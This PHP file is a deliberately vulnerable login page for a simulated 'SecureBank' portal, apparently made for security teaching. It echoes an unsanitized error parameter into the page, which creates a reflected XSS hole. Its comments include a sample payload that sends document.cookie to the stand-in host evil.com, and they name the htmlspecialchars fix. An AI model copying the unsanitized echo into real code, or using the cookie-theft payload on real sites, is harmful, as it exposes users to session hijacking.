<?php
// ============================================================================
// login.php — Login Form (VULNERABLE VERSION)
// ============================================================================
// This page renders the login form. It does NOT process the credentials —
// that job belongs to authenticate.php.
//
// VULNERABILITY PRESENT HERE:
//   - The error message is reflected directly from a GET parameter without
//     any sanitization, opening the door to Reflected XSS.
//     Try: login.php?error=<script>alert('XSS')</script>
//
// In the secure version, we use htmlspecialchars() to neutralize this.
// ============================================================================
session_start();

// If already logged in, skip straight to the dashboard
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    header("Location: dashboard.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank™ — Login Portal</title>
    <style>
        /* --- Minimal dark theme to make the demo look professional --- */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0f0f1a;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: #1a1a2e;
            border: 1px solid #2a2a4a;
            border-radius: 12px;
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 1.8em;
            background: linear-gradient(135deg, #e94560, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .logo p { color: #666; font-size: 0.9em; margin-top: 5px; }
        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 0.85em;
            color: #aaa;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #2a2a4a;
            border-radius: 8px;
            background: #16213e;
            color: #fff;
            font-size: 1em;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #e94560;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(135deg, #e94560, #c23152);
            color: #fff;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
        }
        .error-box {
            background: rgba(233, 69, 96, 0.15);
            border: 1px solid #e94560;
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 0.9em;
            color: #ff6b6b;
        }
        .footer-note {
            text-align: center;
            margin-top: 20px;
            font-size: 0.75em;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>🏦 SecureBank™</h1>
            <p>Employee Portal v2.1.0</p>
        </div>

        <?php
        // =====================================================================
        // VULNERABILITY #1 — Reflected XSS via error parameter
        // =====================================================================
        // The $_GET['error'] value is echoed WITHOUT sanitization.
        // An attacker can craft a URL like:
        //   login.php?error=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
        //
        // When a victim clicks this link, the JS executes in their browser.
        // FIX: Use htmlspecialchars($_GET['error'], ENT_QUOTES, 'UTF-8')
        // =====================================================================
        if (isset($_GET['error'])) {
            echo '<div class="error-box">' . $_GET['error'] . '</div>';
            // ^ DANGEROUS: raw user input injected into HTML
        }
        ?>

        <form action="authenticate.php" method="POST">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username"
                       placeholder="Enter your username" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password"
                       placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn-login">Sign In</button>
        </form>

        <p class="footer-note">
            🔒 This is a simulated banking portal for educational purposes only.
        </p>
    </div>
</body>
</html>
